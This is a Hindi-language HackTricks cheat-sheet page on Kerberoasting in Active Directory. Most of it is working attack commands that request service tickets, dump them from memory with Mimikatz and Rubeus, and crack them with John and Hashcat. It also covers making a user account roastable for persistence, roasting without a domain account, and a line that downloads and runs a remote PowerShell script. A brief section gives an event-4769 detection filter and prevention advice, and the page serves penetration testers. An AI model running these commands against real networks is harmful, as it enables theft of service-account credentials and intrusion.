# केरबेरोस्ट

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से वर्ल्ड के सबसे उन्नत सामुदायिक उपकरणों द्वारा संचालित कार्यप्रवाह बनाएं और स्वचालित करें।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित** की जाए? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की अनुमति चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल** हों या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** **अनुसरण** करें।**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके अपना योगदान दें।**

</details>

## केरबेरोस्ट

**केरबेरोस्ट** का उद्देश्य है कि एडी में उपयोगकर्ता खातों के लिए चलाए जाने वाले सेवाओं के लिए **TGS टिकट हार्वेस्ट** करें। इस प्रकार, इन TGS टिकट का एक हिस्सा उपयोगकर्ता पासवर्ड से निर्मित कुंजियों के साथ **एन्क्रिप्टेड** होता है। इसके परिणामस्वरूप, उनके क्रेडेंशियल्स ऑफलाइन में **क्रैक** किए जा सकते हैं।\
आप जान सकते हैं कि एक **उपयोगकर्ता खाता** किसी **सेवा** के रूप में उपयोग हो रहा है क्योंकि गुणधर्म **"ServicePrincipalName"** **null नहीं** है।

इसलिए, केरबेरोस्ट करने के लिए, केवल एक डोमेन खाता जो TGS के लिए अनुरोध कर सकता है, आवश्यक है, जो कोई भी हो सकता है क्योंकि कोई विशेष विशेषाधिकार आवश्यक नहीं है।

**आपको डोमेन में मान्य प्रमाणिकता की आवश्यकता है।**

### **हमला**

{% hint style="warning" %}
**केरबेरोस्ट उपकरण** आमतौर पर हमला करते समय और TGS-REQ अनुरोधों की शुरुआत करते समय **`RC4 एन्क्रिप्शन`** का अनुरोध करते हैं। इसलिए कि **RC4** [**कमजोर**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) है और इसे Hashcat जैसे उपकरणों का उपयोग करके ऑफलाइन में क्रैक करना आसान है अन्य एन्क्रिप्शन एल्गोरिदमों जैसे AES-128 और AES-256 से।\
RC4 (प्रकार 23) हैश **`$krb5tgs$23$*`** से शुरू होते हैं जबकि AES-256 (प्रकार 18) **`$krb5tgs$18$*`** से शुरू होते हैं।
{% endhint %}

#### **लिनक्स**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
कर्बेरोस्ट करने योग्य उपयोगकर्ताओं के डंप के साथ बहु-सुविधा उपकरण:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **केरबेरोस्ट करने योग्य उपयोगकर्ताओं की जांच करें**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **तकनीक 1: TGS के लिए पूछें और मेमोरी से डंप करें**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **तकनीक 2: स्वचालित उपकरण**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
जब एक TGS का अनुरोध किया जाता है, तो Windows इवेंट `4769 - एक केरबेरोस सेवा टिकट का अनुरोध किया गया था` उत्पन्न होता है।
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें ताकि आप आसानी से वर्ल्ड के सबसे उन्नत सामुदायिक उपकरणों द्वारा संचालित और स्वचालित कार्यप्रवाह बना सकें।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### क्रैकिंग
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### स्थिरता

यदि आपके पास एक उपयोगकर्ता पर **पर्याप्त अनुमतियाँ** हैं, तो आप इसे **केरबेरोस्टेबल** बना सकते हैं:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
आप **kerberoast** हमलों के लिए उपयोगी **टूल** यहाँ ढूंढ सकते हैं: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

यदि आपको लिनक्स से यह **त्रुटि** मिलती है: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** तो इसका कारण आपका स्थानीय समय है, आपको होस्ट को डीसी के साथ समकालीन करने की आवश्यकता है। कुछ विकल्प हैं:

* `ntpdate <DC का IP>` - Ubuntu 16.04 के रूप में अप्रचलित
* `rdate -n <DC का IP>`

### रोकथाम

कर्बेरोस्ट बहुत गुप्तचर है यदि इसका शिकार हो सके

* सुरक्षा घटना आईडी 4769 - कर्बेरोस टिकट का अनुरोध किया गया था
* क्योंकि 4769 बहुत आम है, हम परिणामों को फ़िल्टर करेंगे:
* सेवा का नाम krbtgt नहीं होना चाहिए
* सेवा का नाम $ से समाप्त नहीं होना चाहिए (सेवाओं के लिए उपयोग किए जाने वाले मशीन खातों को फ़िल्टर करने के लिए)
* खाता का नाम machine@domain नहीं होना चाहिए (मशीनों से अनुरोधों को फ़िल्टर करने के लिए)
* विफलता कोड '0x0' है (विफलताओं को फ़िल्टर करने के लिए, 0x0 सफलता है)
* सबसे महत्वपूर्ण बात, टिकट एन्क्रिप्शन प्रकार 0x17 है
* रोकथाम:
* सेवा खाता पासवर्ड को अनुमान लगाने के लिए कठिन बनाया जाना चाहिए (25 वर्णों से अधिक)
* प्रबंधित सेवा खाताएं उपयोग करें (नियमित रूप से पासवर्ड का बदलाव और धारित SPN प्रबंधन)
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
## डोमेन खाते के बिना केरबेरोस्ट

सितंबर 2022 में [चार्ली क्लार्क](https://exploit.ph/) द्वारा एक संकट मिला, जहां KRB_AS_REQ अनुरोध के माध्यम से ST (सेवा टिकट) को किसी भी एक्टिव डायरेक्टरी खाते को नियंत्रित करने की आवश्यकता नहीं होती है। यदि कोई प्रिंसिपल पूर्व-प्रमाणीकरण के बिना प्रमाणित कर सकता है (जैसे AS-REP Roasting हमला), तो इसे उपयोग करके एक **KRB_AS_REQ** अनुरोध शुरू करना संभव होता है और अनुरोध को धोखा देकर एक **ST** के बजाय एक **एन्क्रिप्टेड TGT** के लिए पूछने के लिए, अनुरोध के req-body भाग में **sname** विशेषता को संशोधित करके।

इस तकनीक की पूरी व्याख्या इस लेख में की गई है: [Semperis ब्लॉग पोस्ट](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
आपको उपयोग करने के लिए एक सूची उपयोगकर्ताओं की प्रदान करनी होगी क्योंकि हमारे पास इस तकनीक का उपयोग करके LDAP को क्वेरी करने के लिए कोई वैध खाता नहीं है।
{% endhint %}

#### लिनक्स

* [impacket/GetUserSPNs.py PR #1413 से](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### विंडोज

* [GhostPack/Rubeus से PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
**आईरेड.टीम** में **केरबेरोस्टिंग** के बारे में अधिक जानकारी [यहाँ](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting) और [यहाँ](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled) मिलेगी।

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें।**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से **वर्कफ़्लो बनाएं और स्वचालित करें**, जो दुनिया के **सबसे उन्नत समुदाय उपकरणों** द्वारा संचालित होता है।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
